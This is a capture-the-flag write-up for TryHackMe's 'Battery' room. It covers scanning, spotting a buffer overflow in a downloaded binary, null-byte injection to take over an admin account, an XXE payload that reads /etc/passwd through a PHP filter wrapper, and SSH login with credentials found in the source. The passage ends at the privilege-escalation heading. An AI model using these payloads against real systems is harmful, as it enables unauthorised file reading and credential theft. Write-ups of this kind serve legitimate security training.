<img width="3456" height="2096" alt="image" src="https://github.com/user-attachments/assets/606f2ca8-5be5-4ec4-bce5-073e3e0ababc" />## Battery

<img width="200" height="200" alt="e360a8a69b9074a812f3ee487c0189a0" src="https://github.com/user-attachments/assets/7e7bf35c-614d-45fc-91bb-494963c9c163" />


Room Description: CTF designed by CTF lover for CTF lovers

Machine IP: 10.130.144.221

---

## Enumeration & Recon

First, I ran a rustscan, and only found two active ports: 22, 80. 

> Feroxbuster

```shell
feroxbuster -u http://10.130.144.221/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 
                                                                                                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.130.144.221/
 🚩  In-Scope Url          │ 10.130.144.221
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       24l       57w      406c http://10.130.144.221/
404      GET        9l       34w      299c http://10.130.144.221/Documents%20and%20Settings
404      GET        9l       33w      290c http://10.130.144.221/Program%20Files
200      GET       27l       61w      715c http://10.130.144.221/register.php
200      GET       25l       56w      663c http://10.130.144.221/admin.php
200      GET       24l       57w      406c http://10.130.144.221/index.html
404      GET        9l       33w      289c http://10.130.144.221/reports%20list
200      GET       21l      131w    18602c http://10.130.144.221/report
301      GET        9l       28w      317c http://10.130.144.221/scripts => http://10.130.144.221/scripts/
200      GET       39l      118w     1236c http://10.130.144.221/scripts/jquery-mobilemenu.min.js
200      GET      152l     1205w    70843c http://10.130.144.221/scripts/jquery.min.js
200      GET        4l     1202w    93068c http://10.130.144.221/scripts/jquery.1.9.0.min.js
404      GET        9l       34w      310c http://10.130.144.221/scripts/ie/Documents%20and%20Settings
404      GET        9l       33w      301c http://10.130.144.221/scripts/ie/Program%20Files
301      GET        9l       28w      320c http://10.130.144.221/scripts/ie => http://10.130.144.221/scripts/ie/
200      GET        1l        1w        5c http://10.130.144.221/scripts/ie/index.html
404      GET        9l       33w      300c http://10.130.144.221/scripts/ie/reports%20list
[####################] - 21s     9510/9510    0s      found:17      errors:0      
[####################] - 16s     4751/4751    299/s   http://10.130.144.221/ 
[####################] - 1s      4751/4751    5603/s  http://10.130.144.221/scripts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 10s     4751/4751    468/s   http://10.130.144.221/scripts/ie/
```


> Nikto reveals the PHP version: 5.5.9 which is known for null byte injection vulnerability.

---

> Registering and logging in: 

<img width="3456" height="2096" alt="Screenshot From 2026-07-08 00-29-44" src="https://github.com/user-attachments/assets/7aaa22a7-ead6-4efe-9f5e-3aa8343145c3" />

> I registered a user named: murcy, then tried logging in:

<img width="3456" height="2096" alt="Screenshot From 2026-07-08 00-29-58" src="https://github.com/user-attachments/assets/38b55414-bcfd-41e4-a627-067331cd2f4f" />

> Tried to find some logic bugs in cash withdrawal & depositing, but eventually found an endpoint `/report` which downloads an executable file.

<img width="3456" height="2096" alt="Screenshot From 2026-07-08 00-29-33" src="https://github.com/user-attachments/assets/cd6111b5-6230-4713-84ad-2da7df22f69f" />

---

## Reverse Engineering

<img width="1200" height="510" alt="ghidra-3837924409" src="https://github.com/user-attachments/assets/a68b113a-1ebf-4af4-bdb7-a8a199b711e6" />


> I uploaded the executable file in ghidra, which is a very useful tool by NSA itself, used in reverse engineering.

<img width="3456" height="2096" alt="Screenshot From 2026-07-08 15-02-06" src="https://github.com/user-attachments/assets/b41ea9b0-509f-4aa3-a3ae-edc7f68f0390" />

<img width="3456" height="2096" alt="Screenshot From 2026-07-08 15-03-02" src="https://github.com/user-attachments/assets/d01681a4-41e3-47a1-9ac4-9e5faa102beb" />

> Then I eventually found the code snippet (check [report.c](https://github.com/Velatryx/CTF-Writeups/edit/main/AcademyLabs/TryHackMe/Medium/battery/report.c)) which is vulnerable to `Stack-Based Buffer Overflow`.

> In the snippet, the buffers local_88 and local_68 are allocated 32 bytes each. When scanf reads input into these buffers without a limit, it continues writing past the end of the allocated memory. This allows you to overwrite adjacent stack data, including the saved frame pointer (RBP) and, crucially, the saved return address (RIP). Once you have the offset, you can overwrite the return address with the address of a function you want to execute (e.g., a hidden win() function if one exists, or a system("/bin/sh") call).


> List of users:
support@bank.a
contact@bank.a
cyber@bank.a
admins@bank.a
sam@bank.a
admin0@bank.a
super_user@bank.a
admin@bank.a
control_admin@bank.a
it_admin@bank.a

### Found hardcoded admin email: admin0@bank.a

Normally, the server does not let us register an existing user, but using null byte injection, I tried registering admin account. It did not let me use '%' in UI, so I fire up burpsuite to bypass UI special character restrictions:

> Before Null Byte Injection:

<img width="3138" height="1721" alt="Screenshot From 2026-07-08 16-08-31" src="https://github.com/user-attachments/assets/48899e17-8b8f-4061-b291-51b752207b28" />

> After Null Byte Injection:

<img width="2593" height="1752" alt="Screenshot From 2026-07-08 16-08-45" src="https://github.com/user-attachments/assets/f35ef8d3-0fac-422d-9425-618b25a1a49a" />

Thus we registered an already existing admin user.

<img width="3456" height="1599" alt="Screenshot From 2026-07-08 16-09-02" src="https://github.com/user-attachments/assets/5fb436a1-dfb2-4076-8132-19445fe4d253" />


Then, I started testing admin-only fields, like `forms.php`

<img width="3456" height="1421" alt="Screenshot From 2026-07-08 16-14-31" src="https://github.com/user-attachments/assets/6fec5c4f-9e8c-48fc-b41f-b23ef8373a9d" />


---
## XXE Injection 

Looking at the post request, I noticed it was using XML to send the data. This raised suspicions about XXE Vulnerability. So I tested a payload to see if it is filtered or not:

<img width="3212" height="1634" alt="Screenshot From 2026-07-08 16-24-57" src="https://github.com/user-attachments/assets/75ee3143-8837-4bcb-b7a9-00af470006c7" />

It was indeed vulnerable to XXE.

> Reading what we wrote in plaintext, without any special characters are easy, however, retrieving huge files like /etc/passwd require different approach. They break the structure, thus the output is sent empty. That's why, we can use php wrapper to base64 encode the output, since we identified the server is supported by PHP 5.5.9, and preventing syntax breaks.


```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> 
]>
<root>
    <name>1</name>
    <search>&xxe;</search>
</root>
```

Using this payload, we successfully retrieve the `/etc/passwd` contents encoded in base64. 

<img width="3212" height="1809" alt="Screenshot From 2026-07-08 16-38-28" src="https://github.com/user-attachments/assets/ca3e4f0a-4004-490f-b4b6-d47f2cfb6256" />


I found two users: `cyber` and `yash`. I tried reading their /.ssh/id_rsa, but they were not present, so this method is out.

Then, obviously, I tried reading .php files inside `/var/www/html` directory, like admin.php, and then acc.php. I found useful info inside `acc.php`:

```bash
echo "<br><br><br>";
echo "<input type='text' placeholder='Message' name='msg'>";
echo "<input type='submit' value='Send' name='btn'>";
echo "</form>";
//MY CREDS :- cyber:super#secure&password!
if(isset($_POST['btn']))
{
$ms=$_POST['msg'];
echo "ms:".$ms;
if($ms==="id")
{
system($ms);
}
else if($ms==="whoami")
{
system($ms);
}

```

> Retrieved credentials: `cyber:super#secure&password!`

Let's login using ssh:

```bash
┌──(venv)─(root㉿kali)-[~/venv]
└─# ssh cyber@10.130.144.221
The authenticity of host '10.130.144.221 (10.130.144.221)' can't be established.
ED25519 key fingerprint is: SHA256:bTNXpvfykuLebPN3kSFZTMvEtACHZnk64YKhtu6tMKI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.130.144.221' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
cyber@10.130.144.221's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Jul  8 16:24:22 IST 2026

  System load:  0.76              Processes:           125
  Usage of /:   2.4% of 68.28GB   Users logged in:     0
  Memory usage: 7%                IP address for eth0: 10.130.144.221
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Tue Nov 17 17:02:47 2020 from 192.168.29.248
cyber@ubuntu:~$ ls
flag1.txt  run.py
cyber@ubuntu:~$ cat flag1.txt
THM{6f7e4dd134...6c67ea}

Sorry I am not good in designing ascii art :(
cyber@ubuntu:~$ 

```

That's okay :)

---

### Initial Foothold & PrivEsc

